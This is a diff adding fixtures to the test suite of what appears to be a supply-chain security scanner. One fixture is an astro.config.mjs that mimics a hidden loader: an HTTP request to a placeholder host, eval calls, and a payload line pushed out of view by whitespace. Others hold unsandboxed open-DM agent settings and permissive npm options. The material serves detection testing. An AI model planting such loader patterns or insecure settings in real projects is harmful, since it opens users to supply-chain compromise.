@@ -19,11 +19,118 @@ try {
     path.join(cleanRoot, "package.json"),
     JSON.stringify({ name: "clean-fixture", version: "1.0.0", dependencies: { leftpad: "1.0.0" } }, null, 2)
   );
+  write(
+    path.join(cleanRoot, "astro.config.mjs"),
+    [
+      "import { defineConfig } from 'astro/config';",
+      "export default defineConfig({",
+      "  site: process.env.SITE_URL || 'https://example.org',",
+      "});"
+    ].join("\n")
+  );
   const clean = scanTarget(cleanRoot);
   assert.strictEqual(clean.risk, "no-known-indicators");
   assert.strictEqual(clean.findings.length, 0);
 } finally {
   fs.rmSync(cleanRoot, { recursive: true, force: true });
+}
+
+const astroConfigRoot = makeFixture("scc-astro-config-c2-");
+try {
+  write(
+    path.join(astroConfigRoot, ".gitignore"),
+    ["node_modules/", "branch_structure.json", "temp_auto_push.bat"].join("\n")
+  );
+  write(
+    path.join(astroConfigRoot, "astro.config.mjs"),
+    [
+      "import { defineConfig } from 'astro/config';",
+      "import { createRequire } from 'module';",
+      "const require = createRequire(import.meta.url);",
+      "const http = require('http');",
+      "const endpoint = 'http://example.invalid/$/boot';",
+      "http.request(endpoint, () => {});",
+      "eval(stageBody);",
+      "export default defineConfig({});" + " ".repeat(320) + "global['x']=Buffer.from(payload);eval(stageBody);"
+    ].join("\n")
+  );
+
+  const report = scanTarget(astroConfigRoot);
+  assert.strictEqual(report.risk, "likely-exposed");
+  assert(report.findings.some((finding) => finding.type === "astro-config-require-loader"));
+  assert(report.findings.some((finding) => finding.type === "astro-config-network-eval-loader"));
+  assert(report.findings.some((finding) => finding.type === "astro-config-hidden-payload-line"));
+  assert(report.findings.some((finding) => finding.type === "gitignore-hidden-pr-tooling"));
+} finally {
+  fs.rmSync(astroConfigRoot, { recursive: true, force: true });
+}
+
+const openClawRoot = makeFixture("scc-openclaw-agent-");
+try {
+  write(
+    path.join(openClawRoot, "package.json"),
+    JSON.stringify({ dependencies: { openclaw: "2026.4.20" } }, null, 2)
+  );
+  write(
+    path.join(openClawRoot, ".crabbox.yaml"),
+    [
+      "channels:",
+      "  slack:",
+      "    dmPolicy: \"open\"",
+      "    allowFrom: [\"*\"]",
+      "agents.defaults.sandbox.mode: \"none\""
+    ].join("\n")
+  );
+
+  const report = scanTarget(openClawRoot);
+  assert.strictEqual(report.risk, "possible-exposure");
+  assert(report.findings.some((finding) => finding.type === "openclaw-vulnerable-version"));
+  assert(report.findings.some((finding) => finding.type === "openclaw-open-dm-wildcard"));
+  assert(report.findings.some((finding) => finding.type === "openclaw-open-dm-unsandboxed"));
+} finally {
+  fs.rmSync(openClawRoot, { recursive: true, force: true });
+}
+
+const npmV12Root = makeFixture("scc-npm-v12-");
+try {
+  write(
+    path.join(npmV12Root, "package.json"),
+    JSON.stringify({
+      packageManager: "npm@11.15.0",
+      dependencies: {
+        "git-tool": "github:example/git-tool",
+        "remote-tool": "https://example.invalid/remote-tool-1.0.0.tgz"
+      }
+    }, null, 2)
+  );
+  write(
+    path.join(npmV12Root, "package-lock.json"),
+    JSON.stringify({
+      packages: {
+        "node_modules/native-tool": {
+          version: "1.0.0",
+          hasInstallScript: true
+        }
+      }
+    }, null, 2)
+  );
+  write(
+    path.join(npmV12Root, ".npmrc"),
+    ["allow-git=true", "allow-remote=all", "allow-scripts=*", "ignore-scripts=true"].join("\n")
+  );
+
+  const report = scanTarget(npmV12Root);
+  assert.strictEqual(report.risk, "review-needed");
+  assert(report.findings.some((finding) => finding.type === "npm-v12-prep-old-npm-pin"));
+  assert(report.findings.some((finding) => finding.type === "npm-v12-git-dependency-review"));
+  assert(report.findings.some((finding) => finding.type === "npm-v12-remote-tarball-review"));
+  assert(report.findings.some((finding) => finding.type === "npm-v12-install-script-approval-review"));
+  assert(report.findings.some((finding) => finding.type === "npm-v12-broad-allow-git"));
+  assert(report.findings.some((finding) => finding.type === "npm-v12-broad-allow-remote"));
+  assert(report.findings.some((finding) => finding.type === "npm-v12-broad-allow-scripts"));
+  assert(report.findings.some((finding) => finding.type === "npm-v12-ignore-scripts-migration-note"));
+} finally {
+  fs.rmSync(npmV12Root, { recursive: true, force: true });
 }
 
 const dprkRoot = makeFixture("scc-dprk-rat-");
